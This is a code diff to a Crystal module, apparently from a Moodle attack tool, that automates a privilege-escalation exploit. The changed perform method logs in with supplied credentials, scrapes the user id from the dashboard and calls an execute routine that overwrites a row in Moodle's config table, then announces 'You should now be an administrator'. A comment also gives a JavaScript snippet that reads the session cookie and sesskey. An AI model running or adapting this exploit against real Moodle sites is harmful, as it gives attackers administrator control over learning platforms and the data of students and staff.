@@ -18,15 +18,23 @@ module TMoodleActions
     # alert("MoodleSession: " + document.cookie.match(new RegExp('(^| )MoodleSession=([^;]+)'))[2] + "\nSessKey: " + M.cfg.sesskey + "\nUser id: " + document.querySelectorAll('[data-userid]')[0].getAttribute("data-userid"))
     # Or paste it into the Dev Tools console.
     def perform(url)
-      puts "[?] Enter your MoodleSession. Use helper command if needed."
-      moodle_session = gets().not_nil!
-      puts "[?] Enter session key"
-      sess_key = gets().not_nil!
+      puts "[?] Enter your Moodle username"
+      username = gets().not_nil!
+      puts "[?] Enter your Moodle password"
+      psw = gets().not_nil!
+      sess_info = SessionInfo.new
+      moodle_session = sess_info.get_session(url, username, psw)
       puts "[?] Enter your user id"
-      user_id = gets().not_nil!.to_i
+      user_id = get_user_id(url, moodle_session["moodle_session"])
       puts "[>] Executing attack..."
-      execute(url, moodle_session, sess_key, value: user_id)
+      execute(url, moodle_session["moodle_session"], moodle_session["sess_key"], value: user_id)
       puts "[*] You should now be an administrator."
+    end
+
+    def get_user_id(url, moodle_session)
+      dashboard = http_get(url + "/my/", moodle_session).body
+      user_id = dashboard.match(/id="nav-message-popover-container" data-userid="(([0-9])+)"/).try &.[1]
+      return user_id.not_nil!.to_i
     end
 
     def execute(url, moodle_session, sess_key, table = "config", row_id = 25, column = "value", value = 3)
